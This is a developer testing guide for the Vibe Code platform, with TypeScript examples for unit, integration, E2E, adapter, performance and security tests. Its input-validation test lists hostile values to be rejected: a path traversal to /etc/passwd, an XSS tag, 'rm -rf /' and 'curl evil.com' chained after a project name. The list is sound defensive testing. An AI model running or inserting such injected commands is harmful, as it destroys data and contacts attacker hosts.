# Testing Guide

This guide covers testing strategies and best practices for the Vibe Code platform, including unit tests, integration tests, and end-to-end testing.

## Table of Contents

1. [Testing Strategy](#testing-strategy)
2. [Unit Testing](#unit-testing)
3. [Integration Testing](#integration-testing)
4. [End-to-End Testing](#end-to-end-testing)
5. [Adapter Testing](#adapter-testing)
6. [Performance Testing](#performance-testing)
7. [Security Testing](#security-testing)
8. [Testing Tools and Setup](#testing-tools-and-setup)

## Testing Strategy

Our testing approach follows the testing pyramid:

```
        E2E Tests
       (Few, Slow)
      ↗            ↖
Integration Tests
   (Some, Medium)
  ↗              ↖
 Unit Tests
(Many, Fast)
```

### Test Categories

- **Unit Tests** (70%): Fast, isolated tests for individual components
- **Integration Tests** (20%): Test component interactions and APIs
- **End-to-End Tests** (10%): Full user journey testing

## Unit Testing

### Framework Setup

We use Bun's built-in test runner for unit tests:

```typescript
// example.test.ts
import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { MyComponent } from './MyComponent';

describe('MyComponent', () => {
  let component: MyComponent;

  beforeEach(() => {
    component = new MyComponent();
  });

  afterEach(() => {
    component.cleanup();
  });

  test('should initialize correctly', () => {
    expect(component.isInitialized()).toBe(false);
    component.initialize();
    expect(component.isInitialized()).toBe(true);
  });
});
```

### Backend Component Testing

#### Testing Services

```typescript
// services/ProcessManager.test.ts
import { describe, test, expect, mock } from 'bun:test';
import { ProcessManager } from '../src/services/ProcessManager';

describe('ProcessManager', () => {
  test('should start process successfully', async () => {
    const processManager = new ProcessManager();
    const mockSpawn = mock(() => ({ pid: 1234 }));

    const process = await processManager.startProcess('echo', ['hello']);

    expect(process.pid).toBe(1234);
    expect(mockSpawn).toHaveBeenCalledWith('echo', ['hello']);
  });

  test('should handle process errors', async () => {
    const processManager = new ProcessManager();

    await expect(
      processManager.startProcess('invalid-command', [])
    ).rejects.toThrow('Command not found');
  });
});
```

#### Testing API Endpoints

```typescript
// api/projects.test.ts
import { describe, test, expect } from 'bun:test';
import { app } from '../src/app';

describe('Projects API', () => {
  test('GET /api/projects should return projects list', async () => {
    const response = await app.request('/api/projects');

    expect(response.status).toBe(200);

    const data = await response.json();
    expect(data).toHaveProperty('projects');
    expect(Array.isArray(data.projects)).toBe(true);
  });

  test('POST /api/projects should create new project', async () => {
    const projectData = {
      name: 'Test Project',
      description: 'A test project',
    };

    const response = await app.request('/api/projects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(projectData),
    });

    expect(response.status).toBe(201);

    const data = await response.json();
    expect(data.project.name).toBe('Test Project');
  });
});
```

### Frontend Component Testing

#### Testing React Components

```typescript
// components/Terminal.test.tsx
import { describe, test, expect } from 'bun:test';
import { render, screen, fireEvent } from '@testing-library/react';
import { Terminal } from './Terminal';

describe('Terminal Component', () => {
  test('should render terminal interface', () => {
    render(<Terminal />);

    expect(screen.getByRole('textbox')).toBeInTheDocument();
    expect(screen.getByText('Terminal')).toBeInTheDocument();
  });

  test('should handle input submission', () => {
    const onCommand = mock(() => {});
    render(<Terminal onCommand={onCommand} />);

    const input = screen.getByRole('textbox');
    fireEvent.change(input, { target: { value: 'echo hello' } });
    fireEvent.keyPress(input, { key: 'Enter' });

    expect(onCommand).toHaveBeenCalledWith('echo hello');
  });
});
```

#### Testing Stores (Zustand)

```typescript
// stores/ProjectStore.test.ts
import { describe, test, expect } from 'bun:test';
import { useProjectStore } from './ProjectStore';

describe('ProjectStore', () => {
  test('should add project', () => {
    const store = useProjectStore.getState();

    const project = {
      id: '1',
      name: 'Test Project',
      path: '/test/path',
    };

    store.addProject(project);

    expect(store.projects).toContain(project);
    expect(store.getProject('1')).toEqual(project);
  });

  test('should remove project', () => {
    const store = useProjectStore.getState();

    store.addProject({ id: '1', name: 'Test', path: '/test' });
    store.removeProject('1');

    expect(store.getProject('1')).toBeUndefined();
  });
});
```

### Mocking External Dependencies

#### Mocking File System Operations

```typescript
import { mock } from 'bun:test';

// Mock fs module
const mockFs = {
  readFile: mock((path: string) => Promise.resolve('file content')),
  writeFile: mock((path: string, content: string) => Promise.resolve()),
  exists: mock((path: string) => Promise.resolve(true)),
};

// Use in tests
test('should read configuration file', async () => {
  const config = await readConfigFile('/path/to/config');

  expect(mockFs.readFile).toHaveBeenCalledWith('/path/to/config');
  expect(config).toBeDefined();
});
```

#### Mocking Network Requests

```typescript
import { mock } from 'bun:test';

// Mock fetch
global.fetch = mock((url: string) =>
  Promise.resolve({
    ok: true,
    json: () => Promise.resolve({ data: 'mocked response' }),
  })
);

test('should make API request', async () => {
  const response = await apiCall('/api/data');

  expect(fetch).toHaveBeenCalledWith('/api/data');
  expect(response.data).toBe('mocked response');
});
```

## Integration Testing

Integration tests verify that different components work together correctly.

### API Integration Tests

```typescript
// tests/integration/api.test.ts
import { describe, test, expect, beforeAll, afterAll } from 'bun:test';
import { startTestServer, stopTestServer } from '../helpers/test-server';

describe('API Integration', () => {
  beforeAll(async () => {
    await startTestServer();
  });

  afterAll(async () => {
    await stopTestServer();
  });

  test('should create and retrieve project', async () => {
    // Create project
    const createResponse = await fetch('/api/projects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'Integration Test Project',
        path: '/tmp/test-project',
      }),
    });

    expect(createResponse.status).toBe(201);
    const createdProject = await createResponse.json();

    // Retrieve project
    const getResponse = await fetch(`/api/projects/${createdProject.id}`);
    expect(getResponse.status).toBe(200);

    const retrievedProject = await getResponse.json();
    expect(retrievedProject.name).toBe('Integration Test Project');
  });
});
```

### Database Integration Tests

```typescript
// tests/integration/database.test.ts
import { describe, test, expect, beforeEach } from 'bun:test';
import { Database } from '../src/database';
import { ProjectRepository } from '../src/repositories/ProjectRepository';

describe('Database Integration', () => {
  let db: Database;
  let projectRepo: ProjectRepository;

  beforeEach(async () => {
    // Use in-memory database for testing
    db = new Database(':memory:');
    await db.migrate();
    projectRepo = new ProjectRepository(db);
  });

  test('should persist and retrieve projects', async () => {
    const project = {
      name: 'Test Project',
      path: '/test/path',
      createdAt: new Date(),
    };

    // Save project
    const savedProject = await projectRepo.create(project);
    expect(savedProject.id).toBeDefined();

    // Retrieve project
    const retrievedProject = await projectRepo.findById(savedProject.id);
    expect(retrievedProject?.name).toBe('Test Project');
  });
});
```

### WebSocket Integration Tests

```typescript
// tests/integration/websocket.test.ts
import { describe, test, expect } from 'bun:test';
import { WebSocket } from 'ws';
import { startTestServer } from '../helpers/test-server';

describe('WebSocket Integration', () => {
  test('should establish WebSocket connection', async () => {
    await startTestServer();

    const ws = new WebSocket('ws://localhost:3001');

    await new Promise<void>((resolve, reject) => {
      ws.on('open', () => resolve());
      ws.on('error', reject);
    });

    // Test message exchange
    const messagePromise = new Promise(resolve => {
      ws.on('message', resolve);
    });

    ws.send(JSON.stringify({ type: 'ping' }));

    const response = await messagePromise;
    const data = JSON.parse(response.toString());
    expect(data.type).toBe('pong');
  });
});
```

## End-to-End Testing

E2E tests use Playwright to test complete user workflows.

### Basic E2E Test Setup

```typescript
// tests/e2e/basic.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Basic Application Flow', () => {
  test('should load homepage and create project', async ({ page }) => {
    // Navigate to homepage
    await page.goto('/');
    await expect(page).toHaveTitle(/Vibe Code/);

    // Create new project
    await page.click('[data-testid="create-project"]');
    await page.fill('[data-testid="project-name"]', 'E2E Test Project');
    await page.fill('[data-testid="project-path"]', '/tmp/e2e-test');
    await page.click('[data-testid="submit-project"]');

    // Verify project was created
    await expect(page.locator('[data-testid="project-list"]')).toContainText(
      'E2E Test Project'
    );
  });
});
```

### Terminal Interaction Testing

```typescript
// tests/e2e/terminal.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Terminal Functionality', () => {
  test('should execute commands in terminal', async ({ page }) => {
    await page.goto('/');

    // Open terminal
    await page.click('[data-testid="terminal-tab"]');

    // Execute command
    await page.fill('[data-testid="terminal-input"]', 'echo "Hello World"');
    await page.press('[data-testid="terminal-input"]', 'Enter');

    // Verify output
    await expect(page.locator('[data-testid="terminal-output"]')).toContainText(
      'Hello World'
    );
  });
});
```

### Multi-page Testing

```typescript
// tests/e2e/workflows.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Complete Workflows', () => {
  test('should complete project setup and adapter configuration', async ({
    page,
  }) => {
    // Step 1: Create project
    await page.goto('/');
    await page.click('[data-testid="create-project"]');
    // ... project creation steps

    // Step 2: Configure adapter
    await page.click('[data-testid="adapters-tab"]');
    await page.selectOption('[data-testid="adapter-select"]', 'claude-code');
    // ... adapter configuration steps

    // Step 3: Execute command
    await page.click('[data-testid="terminal-tab"]');
    await page.fill('[data-testid="terminal-input"]', 'help');
    await page.press('[data-testid="terminal-input"]', 'Enter');

    // Verify complete workflow
    await expect(page.locator('[data-testid="terminal-output"]')).toContainText(
      'Available commands'
    );
  });
});
```

## Adapter Testing

### Unit Testing Adapters

```typescript
// adapters/claude-code/tests/adapter.test.ts
import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { ClaudeCodeAdapter } from '../src';

describe('ClaudeCodeAdapter', () => {
  let adapter: ClaudeCodeAdapter;

  beforeEach(() => {
    adapter = new ClaudeCodeAdapter({
      id: 'test-claude',
      name: 'Test Claude Code',
      type: 'cli',
      settings: {
        executable: 'claude-code',
        workingDirectory: '/tmp/test',
      },
    });
  });

  afterEach(async () => {
    await adapter.cleanup();
  });

  test('should initialize successfully', async () => {
    await expect(adapter.initialize()).resolves.not.toThrow();
  });

  test('should handle command execution', async () => {
    const outputPromise = new Promise<string>(resolve => {
      adapter.on('output', data => resolve(data.data));
    });

    await adapter.execute('echo "test"', {});

    const output = await outputPromise;
    expect(output).toContain('test');
  });
});
```

### Integration Testing with Real Tools

```typescript
// adapters/claude-code/tests/integration.test.ts
import { test, expect } from 'bun:test';
import { ClaudeCodeAdapter } from '../src';

test.describe('Claude Code Integration', () => {
  test('should work with real claude-code CLI', async () => {
    // Skip if claude-code not available
    if (!process.env.CLAUDE_CODE_AVAILABLE) {
      test.skip();
      return;
    }

    const adapter = new ClaudeCodeAdapter(config);
    await adapter.initialize();

    const result = await new Promise((resolve, reject) => {
      const outputs: string[] = [];

      adapter.on('output', data => outputs.push(data.data));
      adapter.on('error', reject);
      adapter.on('process-exit', () => resolve(outputs.join('')));

      adapter.execute('--version', {});
    });

    expect(result).toMatch(/claude-code/);
  });
});
```

## Performance Testing

### Load Testing API Endpoints

```typescript
// tests/performance/api-load.test.ts
import { describe, test, expect } from 'bun:test';

describe('API Performance', () => {
  test('should handle concurrent requests', async () => {
    const concurrentRequests = 50;
    const requests = Array.from({ length: concurrentRequests }, () =>
      fetch('/api/projects')
    );

    const startTime = Date.now();
    const responses = await Promise.all(requests);
    const endTime = Date.now();

    // All requests should succeed
    responses.forEach(response => {
      expect(response.status).toBe(200);
    });

    // Performance assertion
    const duration = endTime - startTime;
    expect(duration).toBeLessThan(5000); // 5 seconds for 50 requests
  });
});
```

### Memory Usage Testing

```typescript
// tests/performance/memory.test.ts
import { test, expect } from 'bun:test';
import { ProcessManager } from '../src/services/ProcessManager';

test('should not leak memory with multiple processes', async () => {
  const processManager = new ProcessManager();
  const initialMemory = process.memoryUsage().heapUsed;

  // Create and destroy many processes
  for (let i = 0; i < 100; i++) {
    const proc = await processManager.startProcess('echo', [`test-${i}`]);
    await processManager.terminateProcess(proc.pid);
  }

  // Force garbage collection
  global.gc?.();

  const finalMemory = process.memoryUsage().heapUsed;
  const memoryIncrease = finalMemory - initialMemory;

  // Memory increase should be reasonable
  expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB
});
```

## Security Testing

### Input Validation Testing

```typescript
// tests/security/validation.test.ts
import { test, expect } from 'bun:test';
import { validateProjectName } from '../src/utils/validation';

test.describe('Input Validation', () => {
  test('should reject malicious project names', () => {
    const maliciousInputs = [
      '../../../etc/passwd',
      '<script>alert("xss")</script>',
      'project; rm -rf /',
      'project && curl evil.com',
    ];

    maliciousInputs.forEach(input => {
      expect(() => validateProjectName(input)).toThrow();
    });
  });

  test('should accept valid project names', () => {
    const validInputs = ['my-project', 'Project_123', 'valid.project.name'];

    validInputs.forEach(input => {
      expect(() => validateProjectName(input)).not.toThrow();
    });
  });
});
```

### Authentication Testing

```typescript
// tests/security/auth.test.ts
import { test, expect } from 'bun:test';
import { app } from '../src/app';

test.describe('Authentication', () => {
  test('should reject unauthenticated requests', async () => {
    const response = await app.request('/api/projects');
    expect(response.status).toBe(401);
  });

  test('should accept valid tokens', async () => {
    const token = 'valid-jwt-token';
    const response = await app.request('/api/projects', {
      headers: { Authorization: `Bearer ${token}` },
    });
    expect(response.status).toBe(200);
  });
});
```

## Testing Tools and Setup

### Test Configuration

```typescript
// bun.config.ts
export default {
  test: {
    coverage: {
      enabled: true,
      reporter: ['text', 'html', 'lcov'],
      exclude: ['node_modules/', 'dist/', '**/*.test.ts', '**/*.spec.ts'],
    },
    timeout: 30000,
    reporters: ['default', 'junit'],
  },
};
```

### Playwright Configuration

```typescript
// playwright.config.ts
import { defineConfig } from '@playwright/test';

export default defineConfig({
  testDir: './tests/e2e',
  timeout: 30000,
  retries: process.env.CI ? 2 : 0,
  use: {
    baseURL: 'http://localhost:5173',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
  },
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'firefox', use: { ...devices['Desktop Firefox'] } },
  ],
});
```

### Test Scripts

```json
// package.json
{
  "scripts": {
    "test": "bun test",
    "test:unit": "bun test --testNamePattern='unit'",
    "test:integration": "bun test --testNamePattern='integration'",
    "test:e2e": "playwright test",
    "test:coverage": "bun test --coverage",
    "test:watch": "bun test --watch"
  }
}
```

### Continuous Integration

```yaml
# .github/workflows/test.yml
name: Tests
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: oven-sh/setup-bun@v1

      - name: Install dependencies
        run: bun install

      - name: Run unit tests
        run: bun test

      - name: Run E2E tests
        run: bun run test:e2e

      - name: Upload coverage
        uses: codecov/codecov-action@v3
```

## Best Practices

1. **Test Structure**: Follow the AAA pattern (Arrange, Act, Assert)
2. **Test Isolation**: Each test should be independent and repeatable
3. **Meaningful Names**: Test names should describe what is being tested
4. **Mock External Dependencies**: Use mocks for external services and APIs
5. **Test Data**: Use factories or fixtures for consistent test data
6. **Performance**: Keep unit tests fast, integration tests reasonable
7. **Coverage**: Aim for 80%+ code coverage, but focus on critical paths
8. **Documentation**: Document complex test scenarios and edge cases

---

This comprehensive testing approach ensures the reliability, security, and performance of the Vibe Code platform across all components and user workflows.
